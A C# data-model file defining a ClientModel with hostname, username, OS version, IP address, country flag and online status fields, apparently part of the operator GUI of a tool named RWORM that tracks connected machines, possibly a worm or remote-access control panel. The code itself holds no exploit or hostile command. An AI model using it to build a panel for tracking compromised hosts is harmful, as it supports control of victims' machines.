using System;
using System.IO;
using System.Text.Json.Serialization;

namespace RWORM.GUI.Models
{
    public class ClientModel
    {
        [JsonPropertyName("id")]
        public string Id { get; set; } = string.Empty;

        [JsonPropertyName("guid")]
        public string Guid { get; set; } = string.Empty;

        [JsonPropertyName("hostname")]
        public string Hostname { get; set; } = string.Empty;

        [JsonPropertyName("username")]
        public string Username { get; set; } = string.Empty;

        [JsonPropertyName("os_version")]
        public string OSVersion { get; set; } = string.Empty;

        [JsonPropertyName("ip_address")]
        public string IpAddress { get; set; } = string.Empty;

        [JsonPropertyName("country_code")]
        public string CountryCode { get; set; } = "??";

        [JsonPropertyName("flag")]
        public string Flag { get; set; } = "🌐";

        // Local flag PNG rendered from the bundled SVGs (Resources/Flags).
        // null for unknown/local codes → the cell falls back to the code text.
        [System.Text.Json.Serialization.JsonIgnore]
        public string? FlagImagePath => ResolveFlagPath(CountryCode);

        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, string?> _flagPathCache = new();

        private static string? ResolveFlagPath(string? cc)
        {
            if (string.IsNullOrEmpty(cc) || cc.Length != 2 || cc == "??" || cc == "LO")
                return null;
            return _flagPathCache.GetOrAdd(cc.ToLowerInvariant(), code =>
            {
                var p = Path.Combine(AppContext.BaseDirectory, "Resources", "Flags", code + ".png");
                return File.Exists(p) ? p : null;
            });
        }

        [JsonPropertyName("is_online")]
        public bool IsOnline { get; set; }

        [JsonPropertyName("last_seen")]
        public DateTime? LastSeen { get; set; }

        [JsonPropertyName("created_at")]
        public DateTime? CreatedAt { get; set; }
    }
}